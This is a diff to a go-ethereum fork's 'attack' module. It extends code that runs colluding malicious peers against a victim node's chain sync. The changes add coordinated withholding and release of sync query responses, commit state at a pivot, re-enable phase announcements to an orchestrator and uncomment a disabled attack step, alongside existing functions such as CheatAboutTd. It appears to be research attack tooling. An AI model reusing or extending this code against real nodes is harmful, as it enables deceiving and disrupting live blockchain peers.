@@ -12,6 +12,7 @@ import "github.com/ethereum/go-ethereum/p2p"
 import "github.com/ethereum/go-ethereum/ethdb"
 import "github.com/ethereum/go-ethereum/core/types"
 import "github.com/ethereum/go-ethereum/common"
+import "github.com/ethereum/go-ethereum/core/state"
 import "github.com/ethereum/go-ethereum/attack/msg"
 import "github.com/ethereum/go-ethereum/attack/utils"
 
@@ -52,6 +53,11 @@ var pivot uint64
 var rootAtPivot common.Hash
 var prngSteps map[int]int
 var rollback bool
+var stateCache *state.Database
+var withholdQuery uint64
+var withholdACK bool
+var withholding bool
+var releaseCh chan struct{}
 
 
 
@@ -110,6 +116,7 @@ func Initialize(id string) error {
 	prngSteps[1] = 0
 	prngSteps[100] = 0
 	rollback = false
+	releaseCh = make(chan struct{})
 
 	incoming = make(chan []byte)
 	go readLoop(conn, incoming, quitCh)
@@ -171,13 +178,15 @@ func SetVictimIfNone(v *p2p.Peer) {
 		} else if attackPhase == utils.PredictionPhase && lastOracleBit {
 			attackPhase = utils.SyncPhase
 			log("Switched to", attackPhase, "phase")
-			/*
+
 			err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
 			if err != nil {
 				Close()
 				fatal(err, "Could not announce new phase to orchestrator")
 			}
-			*/
+
+			go stopMovingChecker()
+			go rollbackChecker()
 		} else if attackPhase == utils.SyncPhase {
 			go stopMovingChecker()
 			go rollbackChecker()
@@ -377,7 +386,7 @@ func ReceivedLastRangeQuery() {
 	// For now, we wait for the phase to switch to sync. Later on, this function should be automatically
 	// called when the phase has already switched. Thus, the goroutine may become unnecessary.
 	go func() {
-		return // Remove this to enable correct behaviour
+		//return // Remove this to enable correct behaviour
 		for attackPhase != utils.SyncPhase {
 			time.Sleep(100*time.Millisecond)
 		}
@@ -467,8 +476,9 @@ func GetChainDatabase(chainType utils.ChainType) ethdb.Database {
 	}
 }
 
-func SetTrueChain(db ethdb.Database) {
+func SetTrueChain(db ethdb.Database, stateCacheBc *state.Database) {
 	setChainDatabase(db, utils.TrueChain)
+	stateCache = stateCacheBc
 }
 
 func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, *common.Hash, error) {
@@ -712,6 +722,10 @@ func DelayBeforeServingBatch() {
 	time.Sleep(3*time.Second)
 }
 
+func MiniDelayBeforeServingBatch() {
+	time.Sleep(3000*time.Millisecond)
+}
+
 func WaitBeforePivoting() {
 	timeout := time.NewTimer(10*time.Second)
 	log("Waiting before pivoting")
@@ -798,6 +812,12 @@ func stopMovingChecker() {
 			if fixedHead == 0 {
 				fixedHead = headNumber
 				log("Fixed head for sync phase,", "number =", fixedHead)
+				r := getHeaderByNumber(utils.TrueChain, fixedHead-64).Root
+				err := (*stateCache).TrieDB().Commit(r, true, nil)
+				if err != nil {
+					fatal(err, "Cannot commit root at pivot,", "pivot =", fixedHead-64, "root =", r)
+				}
+
 			}
 			return
 		}
@@ -831,6 +851,18 @@ func SetPivot(pivotNumber uint64) {
 		log("Not setting any pivot because we are in", attackPhase, "phase")
 	}
 	rootAtPivot = getHeaderByNumber(chainType, pivot).Root
+	log("Pivot set", "pivot", pivot, "root", rootAtPivot)
+
+
+	// Shouldn't be necessary, but keep it commented for later maybe
+	/*
+	if fixedHead != 0 {
+		err := (*stateCache).TrieDB().Commit(rootAtPivot, true, nil)
+		if err != nil {
+			fatal(err, "Cannot commit root at pivot,", "pivot =", pivot, "root =", rootAtPivot)
+		}
+	}
+	*/
 }
 
 func RootAtPivot() common.Hash {
@@ -867,6 +899,46 @@ func rollbackChecker() {
 		fatal(err, "Could not notify update to 'rollback'")
 	}
 	master = false
+}
+
+func TryWithhold(query uint64) bool {
+	if !withholdACK {
+		if master {
+			content := make([]byte, 8)
+			binary.BigEndian.PutUint64(content, query)
+			err := sendMessage(msg.WithholdInit.SetContent(content))
+			if err != nil {
+				fatal(err, "Could not init choice of first query to withhold")
+			}
+		}
+		withholdQuery = query
+	} else if !withholding {
+		if query - withholdQuery >= 2048 {
+			content := make([]byte, 8)
+			binary.BigEndian.PutUint64(content, query)
+			err := sendMessage(msg.Release.SetContent(content))
+			log("Releasing response for query.Origin =", withholdQuery)
+			if err != nil {
+				fatal(err, "Could not release withheld query and set new one")
+			}
+			withholding = true
+			withholdQuery = query
+		}
+	} else {
+		fatal(utils.StateError, "Withholding peer should not receive a second query.")
+	}
+	return true
+}
+
+func MustWithhold(query uint64) bool {
+	for !withholdACK {
+		time.Sleep(100*time.Millisecond)
+	}
+	return query==withholdQuery
+}
+
+func ReleaseResponse() chan struct{} {
+	return releaseCh
 }
 
 
@@ -934,6 +1006,7 @@ func handleMessages() {
 				servedPeer := string(message.Content[4:])
 				go ServedBatchRequest(uint64(from), servedPeer)
 			case msg.SetVictim.Code:
+				log("Set victim msg received, phase =", attackPhase)
 				victimLock.Lock()
 				victimID = string(message.Content)
 				servedBatches = make([]bool, len(servedBatches))
@@ -944,10 +1017,12 @@ func handleMessages() {
 				}
 				higherTd.Add(higherTd, bigOne)
 
+				/*
 				if attackPhase == utils.PredictionPhase && lastOracleBit {
 					attackPhase = utils.SyncPhase
 					log("Switched to", attackPhase, "phase")
 				}
+				*/
 				avoidVictim = false
 				victimLock.Unlock()
 			case msg.NewMaliciousPeer.Code:
@@ -978,6 +1053,7 @@ func handleMessages() {
 				}
 			case msg.LastOracleBit.Code:
 				lastOracleBit = true
+				log("Last oracle bit set")
 			case msg.TerminatingStateSync.Code:
 				terminatingStateSync = true
 				go func() {
@@ -1003,6 +1079,49 @@ func handleMessages() {
 				case 1:
 					rollback = true
 				}
+			case msg.WithholdInit.Code:
+				go func() {
+					for withholdQuery == 0 {
+						time.Sleep(100*time.Millisecond)
+					}
+					query := binary.BigEndian.Uint64(message.Content)
+					if query < withholdQuery {
+						withholdQuery = query
+						err := sendMessage(msg.WithholdACK.SetContent([]byte{1}))
+						if err != nil {
+							fatal(err, "Could not reply to init of withheld query")
+						}
+						withholding = false
+					} else {
+						content := make([]byte, 8)
+						binary.BigEndian.PutUint64(content, withholdQuery)
+						content = append([]byte{0}, content...)
+						err := sendMessage(msg.WithholdACK.SetContent(content))
+						if err != nil {
+							fatal(err, "Could not reply to init of withheld query")
+						}
+						withholding = true
+					}
+					log("Comparison brought to withholdQuery =", withholdQuery)
+					withholdACK = true
+				}()
+			case msg.WithholdACK.Code:
+				switch message.Content[0] {
+				case 0:
+					query := binary.BigEndian.Uint64(message.Content[1:])
+					withholdQuery = query
+					withholding = false
+				case 1:
+					withholding = true
+				}
+				log("ACK received, withholdQuery =", withholdQuery)
+				withholdACK = true
+			case msg.Release.Code:
+				withholding = false
+				releaseCh <- struct{}{}
+				withholdQuery = binary.BigEndian.Uint64(message.Content)
+				log("Set withholdQuery =", withholdQuery)
+
 			/*
 			case msg.MustDisconnectVictim.Code:
 				switch message.Content[0] {
